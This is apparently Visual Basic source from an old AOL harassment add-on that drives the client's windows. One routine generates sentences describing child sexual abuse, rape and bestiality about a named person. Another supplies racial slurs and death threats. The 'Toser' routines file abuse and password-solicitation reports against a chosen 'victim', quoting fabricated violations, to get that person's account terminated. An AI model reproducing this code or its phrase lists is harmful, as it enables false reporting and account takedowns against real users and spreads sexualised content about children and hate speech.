    Case 9: Phrase$ = Person + " ANAL ROLLZ JIGGLEY WHEN HE/SHE "
    Case 10: Phrase$ = Person + " INSERTZ HIZ PINKY IN2 DA TIP UV HIZ PENIZ SO HE/SHE CAN "
    Case 11: Phrase$ = Person + " POSEZ AZ A PRIEZT JUST SO HE/SHE CAN "
    Case 12: Phrase$ = "IT MAKEZ " + Person + " CUM IN HIZ PANTIEZ WHEN HE/SHE "
    Case 13: Phrase$ = Person + " STICKZ HIZ THUMB UP HIZ ASS WHEN HE/SHE "
    Case 14: Phrase$ = "ALL PAIN DISSAPPEARZ WHEN " + Person + " "
    Case 15: Phrase$ = Person + " HEART KWIVERZ WHEN HE/SHE "
    Case 16: Phrase$ = Person + " LUVZ 2 CALL HIZ BOYZ WHEN HE/SHE "
    Case 17: Phrase$ = Person + " ENJOYZ WHEN HE/SHE "
    Case 18: Phrase$ = Person + " CRYZ WHEN HE/SHE "
    Case 19: Phrase$ = Person + " CANT WAIT TILL HE/SHE  "
    Case 20: Phrase$ = Person + " REMEMBERZ DA 1ZT TIME WHEN HE/SHE "
    Case 21: Phrase$ = Person + " LIKEZ TO "
    Case 22: Phrase$ = Person + " LEGZ SHAKE WHEN HE/SHE "
    Case 23: Phrase$ = Person + " DRAWLZ DROP FAZT WHEN HE/SHE "
    Case 24: Phrase$ = Person + " EYEZ GET BIG WHEN HE/SHE "
    Case 25: Phrase$ = Person + " ACTZ LIKE HEZ DEAD WHEN HE/SHE "
    Case 26: Phrase$ = Person + " SHOVEZ A FINGER IN HIZ/HER ASS WHEN HE/SHE "
    Case 27: Phrase$ = Person + " CALLZ YOUR MOTHER WHEN HE/SHE "
    Case 28: Phrase$ = "SUMETIMEZ " + Person + " LAUGHZ WHEN HE/SHE "
    Case 29: Phrase$ = Person + " LUVZ 2 FART WHEN HE/SHE "
    Case 30: Phrase$ = Person + " CANT REMEMBER DA LAZT TIME HE/SHE "
        End Select
Select Case Int(Rnd * 36)
    Case 0: Phrase$ = Phrase$ + "FONDLE LITTLE BOYZ"
    Case 1: Phrase$ = Phrase$ + "TOUCH LITTLE GIRLZ"
    Case 2: Phrase$ = Phrase$ + "FINGER FUCK HIZ AZZHOLE"
    Case 3: Phrase$ = Phrase$ + "ANALY RAPE CHICKENZ"
    Case 4: Phrase$ = Phrase$ + "AZZ FUCK NUNS"
    Case 5: Phrase$ = Phrase$ + "MOLEZT PRE SCHOOLERZ"
    Case 6: Phrase$ = Phrase$ + "STRETCH DA AZZHOLEZ OF PRE-SCHOOLERZ"
    Case 7: Phrase$ = Phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK HIZ DICK"
    Case 8: Phrase$ = Phrase$ + "LOOK AT UVA MEN"
    Case 9: Phrase$ = Phrase$ + "TOUCH UDDA MENZ DICK'Z AND DEN LICK DARE NUTTZ"
    Case 10: Phrase$ = Phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: Phrase$ = Phrase$ + "FINGER HIZ MUVUZ CUNT"
    Case 12: Phrase$ = Phrase$ + "STRANGLE LITTLE BOYZ DEN RAPE THEIR DEAD BODIEZ"
    Case 13: Phrase$ = Phrase$ + "GET INTO DA PANTZ UV A 7 YEAR OLD GIRL"
    Case 14: Phrase$ = Phrase$ + "MOLEZT STATUEZ UV GREAT AMERICAN HEROEZ"
    Case 15: Phrase$ = Phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: Phrase$ = Phrase$ + "SHUV A BROOM STICK UP MY PET DOGGZ ASSHOLE"
    Case 17: Phrase$ = Phrase$ + "GO TO A PLAYGROUND AND MOLEZT DA CHILDREN"
    Case 18: Phrase$ = Phrase$ + "BREAK IN A 5 YEAR OLDZ PUSSY"
    Case 19: Phrase$ = Phrase$ + "POUND LITTLE BOYZ INDA AZZ"
    Case 20: Phrase$ = Phrase$ + "BEND OVER LITTLE SCHOOL GURLZ"
    Case 21: Phrase$ = Phrase$ + "LICK OLD WOMEN PUZZYHOLE"
    Case 22: Phrase$ = Phrase$ + "STICK HIZ TOE IN A MANZ PIZZHOLE"
    Case 23: Phrase$ = Phrase$ + "WATCH JAIL MOVIEZ"
    Case 24: Phrase$ = Phrase$ + "SEE A MAN WITH HIS SKIN SHOWING"
    Case 25: Phrase$ = Phrase$ + "LICK A 8 YR OLD BOYZ NUTTSACK"
    Case 26: Phrase$ = Phrase$ + "PUT HIZ HAND IN A CHILDZ PANTZ"
    Case 27: Phrase$ = Phrase$ + "CHANGE A BABYZ DIAPER"
    Case 28: Phrase$ = Phrase$ + "WALK IN ON HIZ MOM -N- DAD FUCKING"
    Case 29: Phrase$ = Phrase$ + "SEE A MAN CHEWING WIT HIS MOUTH OPEN"
    Case 30: Phrase$ = Phrase$ + "HERE SUM1 FART, CUZ IT REMINDZ ME UV DOGGYSTYLE"
    Case 31: Phrase$ = Phrase$ + "SMELL DA SENT UV A DIRTY PUSSY"
    Case 32: Phrase$ = Phrase$ + "SEE SOME1 CHATTING ABOUT DICK"
    Case 33: Phrase$ = Phrase$ + "SEE SOME1 CHATTING ABOUT PUSSY"
    Case 34: Phrase$ = Phrase$ + "HEAR ABOUT SEX"
    Case 35: Phrase$ = Phrase$ + "WAKE UP IN DA MORNING"
    Case 36: Phrase$ = Phrase$ + "AM DONE EATING DINNER"
End Select
SickPhrase = Phrase$
End Function
Sub Chat_SetPrefrencez()
'Ouwop~
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, screenname As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim rlist As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    room& = FindRoom&
    If room& = 0& Then Exit Sub
    rlist& = FindWindowEx(room&, 0&, "_AOL_Icon", vbNullString)
aa1% = GetWindow(rlist&, GW_HWNDNEXT) 'bold
a2% = GetWindow(aa1%, GW_HWNDNEXT) 'italic
a3% = GetWindow(a2%, GW_HWNDNEXT) 'underlined
a4% = GetWindow(a3%, GW_HWNDNEXT) 'da text field
a5% = GetWindow(a4%, GW_HWNDNEXT) 'send
a6% = GetWindow(a5%, GW_HWNDNEXT)
a7% = GetWindow(a6%, GW_HWNDNEXT)
a8% = GetWindow(a7%, GW_HWNDNEXT)
a9% = GetWindow(a8%, GW_HWNDNEXT)
a10% = GetWindow(a9%, GW_HWNDNEXT)
a11% = GetWindow(a10%, GW_HWNDNEXT) '
a12% = GetWindow(a11%, GW_HWNDNEXT) '
a13% = GetWindow(a12%, GW_HWNDNEXT) '
a14% = GetWindow(a13%, GW_HWNDNEXT) 'find a chat
a15% = GetWindow(a14%, GW_HWNDNEXT) '
a16% = GetWindow(a15%, GW_HWNDNEXT) 'pr
a17% = GetWindow(a16%, GW_HWNDNEXT) 'notify
a18% = GetWindow(a17%, GW_HWNDNEXT) 'member
a19% = GetWindow(a18%, GW_HWNDNEXT)
cLickiCoN (a19%)
TimeOut (0.6)
aotimer% = FindWindow("_AOL_modal", vbNullString)
iCheck& = FindChildByClass(aotimer%, "_AOL_checkbox")
nex% = GetWindow(iCheck&, GW_HWNDNEXT)
nex2% = GetWindow(nex%, GW_HWNDNEXT)
nex3% = GetWindow(nex2%, GW_HWNDNEXT)
nex4% = GetWindow(nex3%, GW_HWNDNEXT)
nex5% = GetWindow(nex4%, GW_HWNDNEXT)
a& = SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
If a& = 0 Then cLickiCoN (iCheck&) Else: Beep
b& = SendMessage(nex%, BM_GETCHECK, 0&, 0&)
If b& = 0 Then cLickiCoN (nex%) Else: MsgBox "Already Setup to Be Notifyed When Members Arrive", 64, "Already Setup": Call cLickiCoN(nex5%)
Call cLickiCoN(nex5%)
End Sub

Function Attach(filepath As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(AOL%, "AOL Toolbar")
toolb% = FindChildByClass(tool%, "_AOL_Toolbar")
icona% = FindChildByClass(toolb%, "_AOL_Icon")

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
tit% = FindChildByTitle(MDI%, "Write Mail")
Edi% = FindChildByClass(tit%, "_AOL_Edit")
Rich% = FindChildByClass(tit%, "RICHCNTL")
Loop Until tit% <> 0 And Edi% <> 0 And Rich% <> 0
    For n = 1 To 4
        Edi% = GetWindow(Edi%, GW_HWNDNEXT)
    Next n
    For i = 1 To 22
        Edi% = GetWindow(Edi%, GW_HWNDNEXT)
    Next i


Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)

attch = SendMessage(Rich%, WM_LBUTTONDOWN, 0, 0&)
attch = SendMessage(Rich%, WM_LBUTTONUP, 0, 0&)
waiT (0.3)
Do: DoEvents
mod2% = FindWindow("_AOL_Modal", vbNullString)
Tree2% = FindChildByClass(mod2%, "_AOL_Tree")
stat% = FindChildByClass(mod2%, "_AOL_Static")
iconb% = FindChildByClass(mod2%, "_AOL_Icon")
If mod2% <> 0 And Tree2% <> 0 And stat% <> 0 And iconb% <> 0 Then Exit Do
Loop
  
attchc = SendMessage(iconb%, WM_LBUTTONDOWN, 0, 0&)
attchc = SendMessage(iconb%, WM_LBUTTONUP, 0, 0&)
waiT (0.3)
Do: DoEvents
Fle% = FindWindow("#32770", vbNullString)
edif% = FindChildByClass(Fle%, "Edit")
but% = FindChildByClass(Fle%, "Button")
If Fle% <> 0 And edif% <> 0 And but% <> 0 Then Exit Do
Loop
waiT (0.3)
'Do
'DoEvents:
fillit = SendMessageByString(edif%, WM_SETTEXT, 0, filepath)
but% = GetWindow(but%, GW_HWNDNEXT)
clickit = SendMessage(but%, WM_LBUTTONDOWN, 0, 0&)
clickit = SendMessage(but%, WM_LBUTTONUP, 0, 0&)
'Loop Until edif% = filepath
';'''''''''''''''''''''''''''
Do
DoEvents:
OKw = FindWindow("#32770", "Attach")
Loop Until OKw <> 0
If proG_STAT$ = "OFF" Then Exit Function
okb = FindChildByTitle(OKw, "&Open")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
TimeOut (0.2)

'''''''''''
waiT (0.2)
Do: DoEvents
mod2% = FindWindow("_AOL_Modal", vbNullString)
Tree2% = FindChildByClass(mod2%, "_AOL_Tree")
stat% = FindChildByClass(mod2%, "_AOL_Static")
iconb% = FindChildByClass(mod2%, "_AOL_Icon")
If mod2% <> 0 And Tree2% <> 0 And stat% <> 0 And iconb% <> 0 Then Exit Do
Loop
waiT (0.2)
Do
DoEvents:
iconb% = GetWindow(iconb%, GW_HWNDNEXT) 'detach
    iconb% = GetWindow(iconb%, GW_HWNDNEXT) 'OK
Loop Until iconb% <> 0
clickit = SendMessage(iconb%, WM_LBUTTONDOWN, 0, 0&)
clickit = SendMessage(iconb%, WM_LBUTTONUP, 0, 0&)



End Function
Sub Chat_TOS_Phrase(txt As TextBox)
'ouwop
    Dim phRaZe
    Randomize
    phRaZe = Int(50 * Rnd + 1)
If phRaZe = 1 Then txt = "Fuck you"
If phRaZe = 2 Then txt = "Eat Shit"
If phRaZe = 3 Then txt = "Suck my dick"
If phRaZe = 4 Then txt = "lick my ballz"
If phRaZe = 5 Then txt = "SteveCase iz a asshole"
If phRaZe = 6 Then txt = "die fucking niggers!"
If phRaZe = 7 Then txt = "i dont give a fuck about you"
If phRaZe = 8 Then txt = "i am a hacker"
If phRaZe = 9 Then txt = "i alwayz have free aol, so fuck you"
If phRaZe = 10 Then txt = "Fuck fuck fuck fuck fuck fuck fuck"
If phRaZe = 11 Then txt = "i am gonna kill you bitch!!!!"
If phRaZe = 12 Then txt = "lol bitch"
If phRaZe = 13 Then txt = "i fucked your mother"
If phRaZe = 14 Then txt = "your mom sucked my dick last night"
If phRaZe = 15 Then txt = "i cant wait till the day i fucking kill you"
If phRaZe = 16 Then txt = "what he did was to big, it was a picture, i cant copy and paste it"
If phRaZe = 17 Then txt = "fuck you man"
If phRaZe = 18 Then txt = "suck my asshole"
If phRaZe = 19 Then txt = "dis dick!"
If phRaZe = 20 Then txt = "i wanna suck your dick"
If phRaZe = 21 Then txt = "will you fuck me later"
If phRaZe = 22 Then txt = "i have your address and im coming over to kill you"
If phRaZe = 23 Then txt = "you need 2 get a fucking life"
If phRaZe = 24 Then txt = "give me some mother fucking head"
If phRaZe = 25 Then txt = "deez nuttz in your mutha fucking mouth"
If phRaZe = 26 Then txt = "mexican bitch"
If phRaZe = 27 Then txt = "die white hunkie faget azz trick"
If phRaZe = 28 Then txt = "u know what,? Diz Dick in yoour mouth!"
If phRaZe = 29 Then txt = "i am not sared of aol, FUCK AOL!"
If phRaZe = 30 Then txt = "i wish you would fuck my sister"
If phRaZe = 31 Then txt = "shit shit shit shit shit shit shit"
If phRaZe = 32 Then txt = "Any one know where i can get some weed at??"
If phRaZe = 33 Then txt = "Any selling Crack in here?"
If phRaZe = 34 Then txt = "i need some fucking drugs!"
If phRaZe = 35 Then txt = "i want some speed bitch, not weed"
If phRaZe = 36 Then txt = "i neeed some heroin!"
If phRaZe = 37 Then txt = "fuck me hard!"
If phRaZe = 38 Then txt = "{S FUCKyouNIGGA!"
If phRaZe = 39 Then txt = "i hope you do report me, ill come back on my <>< and hack your comp!"
If phRaZe = 40 Then txt = "im not scared of you or aol!"
If phRaZe = 41 Then txt = "fuck you bitch ass whore"
If phRaZe = 42 Then txt = "i cant wait till you suck my dick, im gonna fuck you sooo hard"
If phRaZe = 43 Then txt = "I am racist!, Die indian Bitchez, fuck Niggerz, n White people!"
If phRaZe = 44 Then txt = "my cat is fucking my dog"
If phRaZe = 45 Then txt = "my Dog wont stop fucking my leg...hehe"
If phRaZe = 46 Then txt = "i hop aol gets a faster fucking server"
If phRaZe = 47 Then txt = "il sign on my guide account and kill yours!"
If phRaZe = 48 Then txt = "i dare you to report me, i will fucking rip your head off!"
If phRaZe = 49 Then txt = "1 day, im gonna own AOL, and Kill al your accounts"
If phRaZe = 50 Then txt = "im getting ready to go Phishing, neeed osme Accounts bad!"


End Sub

Sub CHAT_Toser(time As String, name As String, room As String, phRaZe As String)
If name = "" Then
MsgBox "No1 Named in Victim Box to TOS!", vbCritical, "ERROR!'"
Else
If room = "" Then
MsgBox "Must be in a Chat room to use this!", vbCritical, "ERROR!"
Else
If phRaZe = "" Then
MsgBox "Must Select a Phrase to Use!", vbCritical, "ERROR!"
Else
Call XAOL4_Keyword("Notify AOL")
Do
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
NotifY% = FindChildByTitle(MDI%, "Keyword: Notify AOL")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword: Notify AOL")
Call TimeOut(2)
aoicon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until aoicon2% <> 0
Call TimeOut(0.05)
Clicker (aoicon2%)
Clicker (aoicon2%)
haha% = FindChildByTitle(NotifY%, "Date/Time (am/pm):")
tank% = GetWindow(haha%, GW_HWNDNEXT)
X = SendMessageByString(tank%, WM_SETTEXT, 0, time)
firsttext% = GetWindow(stat%, GW_HWNDNEXT)
X = SendMessageByString(firsttext%, WM_SETTEXT, 0, Now)
stat% = FindChildByTitle(NotifY%, "Room Name:")
sectext% = GetWindow(stat%, GW_HWNDNEXT)
X = SendMessageByString(sectext%, WM_SETTEXT, 0, room)
stat% = FindChildByTitle(NotifY%, "Person You Are Reporting:")
krazyl% = GetWindow(stat%, GW_HWNDNEXT)
X = SendMessageByString(krazyl%, WM_SETTEXT, 0, name)
bizzy% = FindChildByTitle(NotifY%, "Paste a Copy of the Chat Violation Here:")
tank% = GetWindow(bizzy%, GW_HWNDNEXT)
X = SendMessageByString(tank%, WM_SETTEXT, 0, name & ":    " & phRaZe)
AOLIcon6% = GetWindow(tank%, GW_HWNDNEXT)
Call cLickiCoN(AOLIcon6%)
waitforOK
Do
Call AOL4_KillWin(KeyWordWin%)
Loop Until NotifY% <> 0

End If
End If
End If
End Sub
Sub IM_Toser(name$, phRaZe$)
If name$ = "" Then
MsgBox "No1 Named in Victim Box to TOS!", vbCritical, "ERROR!'"
Else
If phRaZe$ = "" Then
MsgBox "Must Select a Phrase to Use!", vbCritical, "ERROR!"
Else

Tippie = "aol://4344:50.DKPsurf2.6593499.548013513"
XAOL4_Keyword (Tippie)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Do
DoEvents
report2% = FindChildByTitle(MDI%, "Report Password Solicitations")
DoEvents
Loop Until report2% <> 0
Do
Edi = FindChildByClass(report2%, "_AOL_Edit")
edi2 = GetWindow(Edi, GW_HWNDNEXT)
edi3 = GetWindow(edi2, GW_HWNDNEXT)
edi4 = GetWindow(edi3, GW_HWNDNEXT)
edi5 = GetWindow(edi4, GW_HWNDNEXT)
edi6 = GetWindow(edi5, GW_HWNDNEXT)
edi7 = GetWindow(edi6, GW_HWNDNEXT)
edi8 = GetWindow(edi7, GW_HWNDNEXT)
edi9 = GetWindow(edi8, GW_HWNDNEXT)
send edi7, name$
send edi9, phRaZe$
AOIcon% = FindChildByClass(report2%, "_AOL_Button")
Call TimeOut(1)
Clicker (AOIcon%)
Loop Until FindChildByTitle(MDI%, "Report Password Solicitations") = False
waitforOK
AOL4_KillWin report2%
End If
End If
End Sub
Sub Clicker(Button%)
'This clicks a button that you specify
Dim ClickDown%, ClickUp%
ClickDown% = SendMessageByNum(Button%, WM_LBUTTONDOWN, &HD, 0)
ClickUp% = SendMessageByNum(Button%, WM_LBUTTONUP, &HD, 0)
'NoFreeze% = DoEvents()
'NoFreeze% = DoEvents()
End Sub

Sub Minimize_AOL()
 AOL% = FindWindow("AOL Frame25", vbNullString)
mi = ShowWindow(AOL%, SW_MINIMIZE)
End Sub
Sub Maximize_AOL()
'ouwop
'aol2/4
AOL% = FindWindow("AOL Frame25", vbNullString)
mi = ShowWindow(AOL%, SW_MAXIMIZE)
End Sub
Sub send(chatedit, god$)
SendTheText = SenditByString(chatedit, WM_SETTEXT, 0, god$)
End Sub
Public Function AOLGetMemberProfile(nAm As String) As String
Dim Edi%
Call RunMenuByChar(9, "G")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
tit% = FindChildByTitle(MDI%, "Get A Member's Profile")
Edi% = FindChildByClass(tit%, "_AOL_Edit")
icona% = FindChildByClass(tit%, "_AOL_Icon")
fillit = SendMessageByString(Edi%, WM_SETTEXT, 0, nAm)
clickit = SendMessage(icona%, WM_LBUTTONDOWN, 0, 0&)
clickit = SendMessage(icona%, WM_LBUTTONUP, 0, 0&)
Loop Until tit% <> 0 And gettext(Edi%) = nAm
TimeOut (0.6)
chekOK:
closeit = SendMessage(tit%, WM_CLOSE, 0, 0&)
waiT (0.5)
 OKw = FindWindow("#32770", "America Online")
 okb = FindChildByTitle(OKw, "OK")
If OKw <> 0 Then
sendchat ASCII_Random + " " + nAm + " haz no profile!"
 okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
 oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
closeit = SendMessage(tit%, WM_CLOSE, 0, 0&)
Exit Function
Else
If FindWindow("#32770", "America Online") Then GoTo chekOK:
AOLGetMemberProfile = prof$
End If
End Function
Function AOLGetMemberProfile3(nAm As String) As String
Dim Edi%
Call RunMenuByChar(9, "G")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
tit% = FindChildByTitle(MDI%, "Get A Member's Profile")
Edi% = FindChildByClass(tit%, "_AOL_Edit")
icona% = FindChildByClass(tit%, "_AOL_Icon")
fillit = SendMessageByString(Edi%, WM_SETTEXT, 0, nAm)
grr:
TimeOut (0.2)
Call SendMessageLong(icona%, WM_CHAR, VK_SPACE, 0&)
Call SendMessageLong(icona%, WM_CHAR, VK_RETURN, 0&)
Loop Until tit% <> 0 And gettext(Edi%) = nAm
tit2% = FindChildByTitle(MDI%, "Member Profile")
TimeOut (0.5)
chekOK:
waiT (0.5)

 OKw = FindWindow("#32770", "America Online")
 okb = FindChildByTitle(OKw, "OK")
If OKw <> 0 Then
AOLGetMemberProfile3 = ""
 okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
 oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
closeit = SendMessage(tit%, WM_CLOSE, 0, 0&)
Exit Function
End If

If tit2% <> 0 Then
closeit = SendMessage(tit%, WM_CLOSE, 0, 0&)
If FindWindow("#32770", "America Online") Then GoTo chekOK:
Do
DoEvents:
If FindWindow("#32770", "America Online") Then GoTo chekOK:
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
tit2% = FindChildByTitle(MDI%, "Member Profile")
view% = FindChildByClass(tit2%, "RICHCNTL")
view% = gettext(Remove_HTML(view%))
Loop Until tit2% <> 0 And view% <> 0
If FindWindow("#32770", "America Online") Then GoTo chekOK:
TimeOut (0.2)
If FindWindow("#32770", "America Online") Then GoTo chekOK:
Do
DoEvents
If FindWindow("#32770", "America Online") Then GoTo chekOK:
trm$ = gettext(view%)
If FindWindow("#32770", "America Online") Then GoTo chekOK:
Loop Until trm$ = gettext(view%)
TimeOut (0.0001)
closeit = SendMessage(tit2%, WM_CLOSE, 0, 0&)
closeit = SendMessage(tit%, WM_CLOSE, 0, 0&)
prof$ = trm$
If FindWindow("#32770", "America Online") Then GoTo chekOK:
AOLGetMemberProfile3 = prof$
Else
TimeOut (0.1)
GoTo grr
End If

End Function
Public Function AOLGetMemberProfile4(Person As String, Text As Control) As String
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim GetProfileWindow As Long, AolEdit As Long, GotProfileWindow As Long
    Dim AolView As Long, message As Long, Button As Long
    Dim Static1 As Long, Static2 As Long
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    Call RunMenuByChar(9, "G")
    Do: DoEvents
        GetProfileWindow& = FindWindowEx(AolMdi&, 0&, "AOL Child", "Get a Member's Profile")
        AolEdit& = FindWindowEx(GetProfileWindow&, 0&, "_AOL_Edit", vbNullString)
    Loop Until GetProfileWindow& <> 7 And AolEdit& <> 0&
    Call SendMessageByString(AolEdit&, WM_SETTEXT, 0&, Person$)
    Call SendMessageLong(AolEdit&, WM_CHAR, VK_SPACE, 0&)
    Call SendMessageLong(AolEdit&, WM_CHAR, VK_RETURN, 0&)
    Do: DoEvents
        GotProfileWindow& = FindWindowEx(AolMdi&, 0&, "AOL Child", "Member Profile")
        message& = FindWindow("#32770", "America Online")
        AolView& = FindWindowEx(GotProfileWindow&, 0&, "RICHCNTL", vbNullString)
     Loop Until GotProfileWindow& <> 0& And AolView& <> 0& Or message& <> 0&
    Do
    DoEvents:
    TimeOut (0.01)
    dat$ = gettext(AolView&)
    Loop Until dat$ = gettext(AolView&)
   Text.caption = dat$
    If GotProfileWindow& <> 0& Then
        TimeOut (0.5)
        If gettext(AolView&) = "" Then
            AOLGetMemberProfile4$ = "" 'Person$ & "' s profile is blank."
            Call PostMessage(GotProfileWindow&, WM_CLOSE, 0&, 0&)
            Call PostMessage(GetProfileWindow&, WM_CLOSE, 0&, 0&)
            Exit Function
           ElseIf gettext(AolView&) <> "" Then
            AOLGetMemberProfile4$ = gettext(AolView&)
                Call AOL4_KillWin(GotProfileWindow&)
            Exit Function
        End If
       Else
        Static1& = FindWindowEx(message&, 0&, "Static", vbNullString)
        Static2& = FindWindowEx(message&, Static1&, "Static", vbNullString)
        Button& = FindWindowEx(message&, 0&, "Button", vbNullString)
        AOLGetMemberProfile4$ = gettext(Static2&)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(GetProfileWindow&, WM_CLOSE, 0&, 0&)
          Call AOL4_KillWin(GotProfileWindow&)
        Exit Function
    End If
    
    
    End Function

Function RunMenuByChar(IconNum As Integer, Letter As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(AOL%, "AOL Toolbar")
toolb% = FindChildByClass(tool%, "_AOL_Toolbar")
icona% = FindChildByClass(toolb%, "_AOL_Icon")

For i = 1 To IconNum
icona% = GetWindow(icona%, GW_HWNDNEXT)
Next i
    DoEvents
        Chng$ = CharToChr(Letter)
               
            SendLetter = SendMessageByString(icona%, WM_CHAR, Chng$, 0&)

End Function
Function CharToChr(Letter As String)
c = Asc(Letter)

CharToChr = c

End Function
Public Function ChatNOW() As String
'Ouwop
'go0d for <><erz
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, pString As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
      Do
      sMod& = FindWindow("#32768", vbNullString)
      WinVis& = IsWindowVisible(sMod&)
      Loop Until WinVis& = 1
    If AOL_VerzioN = 5 Then Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    If AOL_VerzioN = 5 Then Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)

   Call SetCursorPos(CurPos.X, CurPos.Y)
 
End Function

Public Function MacroFilter_Shadow(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, " |", ";|")
    MyString$ = RePlacestRing(MyString$, "| ", "|;")
    MacroFilter_Shadow$ = MyString$
End Function

Public Function MacroFilter_Smear(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, "|", "¦")
    MyString$ = RePlacestRing(MyString$, "   ¦", ".:;¦")
    MyString$ = RePlacestRing(MyString$, "  ¦", ":;¦")
    MyString$ = RePlacestRing(MyString$, " ¦", ";¦")
    MyString$ = RePlacestRing(MyString$, "   /", ".:;/")
    MyString$ = RePlacestRing(MyString$, "  /", ":;/")
    MyString$ = RePlacestRing(MyString$, " /", ";/")
    MyString$ = RePlacestRing(MyString$, "   \", ".:;\")
    MyString$ = RePlacestRing(MyString$, "  \", ":;\")
    MyString$ = RePlacestRing(MyString$, " \", ";\")
    MyString$ = RePlacestRing(MyString$, "   '", ".:;'")
    MyString$ = RePlacestRing(MyString$, "  '", ":;'")
    MyString$ = RePlacestRing(MyString$, " '", ";'")
    MacroFilter_Smear$ = MyString$
End Function


Public Function MacroFilter_PsYTop(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, "¯¯¯", "`'¯`“")
    MacroFilter_PsYTop$ = MyString$
End Function

